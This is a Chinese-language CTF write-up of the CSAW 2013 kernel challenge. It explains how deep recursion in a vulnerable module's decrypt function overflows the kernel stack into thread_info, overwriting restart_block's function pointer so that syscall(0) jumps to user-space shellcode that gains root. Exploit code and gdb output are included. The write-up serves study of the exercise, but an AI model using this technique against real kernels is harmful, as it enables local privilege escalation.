
# csaw 2013

简单说下原理：在Linux上，系统上的每个线程都在内核内存中分配了相应的内核堆栈。x86上的Linux内核堆栈的大小为4096或8192字节。尽管此大小似乎很小，无法包含完整的调用链和相关的本地堆栈变量，但实际上内核调用链相对较浅，当使用高效的分配器（如SLUB）时，不鼓励内核函数滥用带有大局部堆栈变量的宝贵空间。可用。堆栈与`thread_info`结构共享4k / 8k的总大小，该结构包含有关当前线程的一些元数据，如`include/linux/sched.h`中所示：

```
union thread_union {

    struct thread_info thread_info;

    unsigned long stack[THREAD_SIZE/sizeof(long)];

};
```

根据题目的提示的信息，我们可以对应到linux v2.6.39.4的版本

然后在x86下的`thread_info`的结构是这样的：

```
struct thread_info {

    struct task_struct    *task;        /* main task structure */

    struct exec_domain    *exec_domain;    /* execution domain */

    __u32            flags;        /* low level flags */

    __u32            status;        /* thread synchronous flags */

    __u32            cpu;        /* current CPU */

    int            preempt_count;    /* 0 => preemptable,

                           <0 => BUG */

    mm_segment_t        addr_limit;

    struct restart_block    restart_block;

    void __user        *sysenter_return;

#ifdef CONFIG_X86_32

    unsigned long           previous_esp;   /* ESP of the previous stack in

                           case of nested (IRQ) stacks

                        */

    __u8            supervisor_stack[0];

#endif

    int            uaccess_err;

};
```

由于内核内存空间有限，当内核中的函数需要超过4k / 8k的堆栈空间或长调用链超出可用堆栈空间时，那么就会发生堆栈溢出，并且如果`thread_info`结构或超出其的关键内存损坏，则常会导致内核崩溃。但是如果可以对齐其结构体，并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。

这里的话，可以将`restart_block`作为一个攻击切入点，`restart_block`是每个线程的结构，用于跟踪信息和参数以重新启动系统调用。如果在`sigaction`中指定了`SA_RESTART`，则被信号中断的系统调用可以中止并返回`EINTR`，也可以自行重启。在`include/linux/thread_info.h`中，`restart_block`的定义如下：

```
struct restart_block {

    long (*fn)(struct restart_block *);

    union {

        /* For futex_wait and futex_wait_requeue_pi */

        struct {

            u32 __user *uaddr;

            u32 val;

            u32 flags;

            u32 bitset;

            u64 time;

            u32 __user *uaddr2;

        } futex;

        /* For nanosleep */

        struct {

            clockid_t clockid;

            struct timespec __user *rmtp;

#ifdef CONFIG_COMPAT

            struct compat_timespec __user *compat_rmtp;

#endif

            u64 expires;

        } nanosleep;

        /* For poll */

        struct {

            struct pollfd __user *ufds;

            int nfds;

            int has_timeout;

            unsigned long tv_sec;

            unsigned long tv_nsec;

        } poll;

    };

};
```

需要关注的是第一个函数指针，先来看下是否可以触发这个指针，在`kernel/signal.c`中发现可以通过`restart_syscall`函数来调用`restart_block`的`fn`指向的函数

```
SYSCALL_DEFINE0(restart_syscall)

{

    struct restart_block *restart = &current_thread_info()->restart_block;

    return restart->fn(restart);

}
```

而在`arch/x86/kernel/syscall_table_32.S`中定义了`restart_syscall`的系统调用号：

```
.long sys_restart_syscall /* 0 - old "setup()" system call, used for restarting */
```

也就是说我们可以通过`syscall(0)`就能触发到这个`fn`指向的函数了，那如果可以破坏`thread_info`的`restart_block`成员中的函数指针，将其指向我们控制下的用户空间中的函数，那么就可以劫持程序流了。

以上就是大致的原理部分，程序本身是一个加密解密模块，这不是我们关注的重点，重点在于我们是否能够在内核空间将使用地址覆盖到`thread_info`，直接分配大空间内存在这里无法实现，所以考虑不断分配空间的方式，即找寻递归函数，在`decrypt`函数我们看到了一个`decrypt`自身的递归调用，比较明显的是`round`的值代表了控制解密的轮数，在这里也就是分配栈帧的次数，如果我们可以控制这个`round`为一个合适的较大值，那么我们就可以覆盖到`thread_info`了

```
void

decrypt(uint32_t k[], char *buf, int len, int rounds)

{

        int i;

        if (rounds >= 0) {

                if (rounds % 3 == 0) {

                        k[0] ^= k[1]; k[1] ^= k[0]; k[0] ^= k[1];

                        k[2] ^= k[3]; k[3] ^= k[2]; k[2] ^= k[3];

                } else if (rounds % 3 == 1) {

                        k[0] ^= k[2]; k[2] ^= k[0]; k[0] ^= k[2];

                        k[1] ^= k[3]; k[3] ^= k[1]; k[1] ^= k[3];

                } else if (rounds % 3 == 2) {

                        k[0] ^= k[3]; k[3] ^= k[0]; k[0] ^= k[3];

                        k[2] ^= k[1]; k[1] ^= k[2]; k[2] ^= k[1];

                }

                decrypt(k, buf, len, rounds-1);

        } else {

                for (i = 0; i < len / 8; i++) {

                        descramble(k, (uint32_t *)(buf + (i * 8)), (uint32_t *) 0, (uint32_t *) DELTA);

                }

        }

}
```

而这个`round`值在`key_write`函数中被赋值，可以看到从`copy_from_user`获取用户的输入，然后按照格式化字符串的填入`key`和`rounds`。

```
int

key_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)

{

        char buf[MAX_LENGTH];

        printk(KERN_INFO "csaw: called key_write\n");

        memset(buf, 0, sizeof(buf));

        if (count > MAX_LENGTH) {

                count = MAX_LENGTH;

        }

        if (copy_from_user(&buf, ubuf, count)) {

                return -EFAULT;

        }

        sscanf(buf, "%16c\t%d", (char *) key, &rounds);

        return count;

}
```

填充`rounds`和触发的函数如下, 就是打开相应模块然后触发各自实现的读入函数（读入函数这里就不放了，类似于第一个案例的实现）：

```
void

set_rounds(int rounds)

{

        FILE *fp = open_file("/proc/csaw2011/key");

        fprintf(fp, "FFFFFFFFFFFFFFFF\t%d\n", rounds);

        fclose(fp);

        printf("[+] Rounds set successfully\n");

}

void

trigger_vuln(void)

{

        FILE *fp = open_file("/proc/csaw2011/decrypt");

        fprintf(fp, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");

        fclose(fp);

        syscall(0);

}
```

当然有点无语的是具体shellcode填充，给了x86架构的exp，然而放在androidkernel的题库里。。。shellcode就是类似于jop的思路

```
/* This function just does:

 * asm("mov $get_root, %eax; jmp *%eax;");

 *

 * The format of these instructions is:

 * mov addr, %eax       => b8 little_endian(addr)

 * jmp *%eax            => ff e0

 */

void

generate_shellcode(char *buf)

{

        long *p;

        *buf++ = '\xb8';



        /* mov $get_root, %eax */

        p = (long *)buf;

        *p = (long)&get_root;

        buf += sizeof(long *);



        /* jmp eax */

        *buf++ = '\xff';

        *buf++ = '\xe0';

}
```

当我费心改成arm架构的机器码挂上去调试的时候，却突然发现不同架构的`thread_info`的结构体都不一样 :)

在linux之前的内核中，还没有`lx`的辅助调试选项，所以查看`thread_info`的方式要稍麻烦些

首先我们需要根据栈地址拿到`thread_info`的地址，根据上文`thread_union`结构体可知可以通过程序的局部变量的地址（`&retval`）获得内核栈的地址。又因为`thread_info`位于内核栈顶部而且是 8k（或者 4k）对齐的，所以利用`栈地址 & (~(THREAD_SIZE - 1))`就可以计算出`thread_info`的地址。

而`THREAD_SIZE`的定义在`thread_info.h`中, 下面是arm架构的`THREAD_SIZE`定义，`THREAD_SIZE_ORDER`和`PAGE_SIZE`根据架构有所不同，这里由于是arm 32位，所以这里的`THREAD_SIZE = 4096 * 2 = 0x2000`

```
#define THREAD_SIZE_ORDER    1

#define THREAD_SIZE        (PAGE_SIZE << THREAD_SIZE_ORDER)
```

就是在调试时才发现原来`thread_info`的结构体也不一样，猝。。。

```
(gdb) p/x $sp

$10 = 0xd1c4fe88



>>> hex(sp&(~(0x2000-1)))

'0xd1c4e000'



(gdb) p *(struct thread_info *) 0xd1c4e000

$12 = {flags = 0, preempt_count = 0, addr_limit = 3204448256, task = 0xd1c38c00,

  exec_domain = 0xc048ca6c, cpu = 0, cpu_domain = 21, cpu_context = {r4 = 3725747072,    

    r5 = 3519253504, r6 = 3226005544, r7 = 3615050560, r8 = 3726621696, r9 = 3519340544, 

    sl = 3519340544, fp = 3519348100, sp = 3519348048, pc = 3224796784, extra = {0, 0}}, 

  syscall = 0, used_cp = '\000' <repeats 15 times>, tp_value = 3070189536,

  crunchstate = {mvdx = {{0, 0} <repeats 16 times>}, mvax = {{0, 0, 0}, {0, 0, 0}, {0,    

        0, 0}, {0, 0, 0}}, dspsc = {0, 0}}, fpstate = {hard = {save = {

        0 <repeats 35 times>}}, soft = {save = {0 <repeats 35 times>}}}, vfpstate = {     

    hard = {fpregs = {0 <repeats 32 times>}, fpexc = 1073741824, fpscr = 0, fpinst = 0,   

      fpinst2 = 0}}, restart_block = {fn = 0xc0028dcc <do_no_restart_syscall>, {futex = { 

        uaddr = 0x0, val = 0, flags = 0, bitset = 0, time = 0, uaddr2 = 0x0},

      nanosleep = {clockid = 0, rmtp = 0x0, expires = 0}, poll = {ufds = 0x0, nfds = 0,   

        has_timeout = 0, tv_sec = 0, tv_nsec = 0}}}}
```

其结构体就不再放了，查看`task_struct`的话可以看到`cred`的地址, 然后查看`cred`内的id：

```
(gdb) p *(struct task_struct *)  0xd1c38c00

...

real_cred = 0xde29be40, cred = 0xde29be40,

...
```
